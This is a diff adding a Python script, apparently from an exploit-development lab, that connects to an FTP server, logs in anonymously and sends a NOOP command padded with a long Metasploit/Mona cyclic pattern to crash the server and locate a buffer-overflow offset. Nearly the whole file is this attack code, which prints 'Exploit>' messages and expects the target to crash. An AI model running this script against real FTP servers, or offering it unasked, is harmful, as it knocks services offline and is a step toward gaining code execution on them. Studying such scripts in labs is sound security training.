@@ -1,0 +1,58 @@
+import socket
+
+# Define the target server IP and Port
+target_ip = '127.0.0.1'
+target_port = 21
+
+# Replace the pattern with the one created from Metasploit or Mona
+pattern = (
+	b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
+)
+
+# Command
+command = b'NOOP '
+
+try:
+	# Create a socket object and connect to the server
+	print('Exploit> Connect to target')
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_ip, target_port))
+
+	# Timeout
+	s.settimeout(5)
+
+	# Receive banner from server
+	banner = s.recv(1024).decode('utf-8', errors='ignore')
+	#print(f'Server> {banner}')
+
+	# Send USER command
+	#print('Exploit> Send USER command')
+	s.send(b'USER anonymous\r\n')
+
+	# Receive the response
+	response = s.recv(1024).decode('utf-8', errors='ignore')
+	#print(f'Server> {response}')
+
+	# Send PASS command
+	#print('Exploit> Send PASS command')
+	s.send(b'PASS anonymous\r\n')
+
+	# Receive the response
+	response = s.recv(1024).decode('utf-8', errors='ignore')
+	#print(f'Server> {response}')
+
+	# Offset discovery
+	print(f'Exploit> Sending pattern to discover offset')
+	offset_discovery = command + pattern + b'\r\n'
+	s.send(offset_discovery)
+
+	# Receive the response
+	print('Exploit> The target server is expected to crash.')
+
+except Exception as e:
+	# Exception handling
+	print(f'An error occurred: {str(e)}')
+
+finally:
+	# Close the connection
+	s.close()
